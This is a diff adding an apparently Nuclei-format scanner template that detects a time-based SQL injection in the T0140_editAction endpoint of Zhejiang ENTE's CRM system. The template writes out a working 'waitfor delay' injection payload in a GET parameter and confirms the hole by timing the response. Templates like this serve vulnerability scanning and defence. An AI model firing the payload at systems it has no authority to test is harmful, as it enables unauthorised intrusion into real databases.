@@ -1,0 +1,26 @@
+id: zhedaente-customer-crm-t0140-editaction-sqli
+info:
+  name: Zhejiang ENTE CRM T0140_editAction SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL Injection vulnerability in Zhejiang ENTE Customer Resource Management System at endpoint T0140_editAction.
+    Exploit involves SQL payload with a time-based delay to confirm the vulnerability.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+
+http:
+  - method: GET
+    path:
+      - "/entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&documentnum=1%27;waitfor+delay+%270:0:{{t1}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration > t1"
+          - "contains(body, '0')"
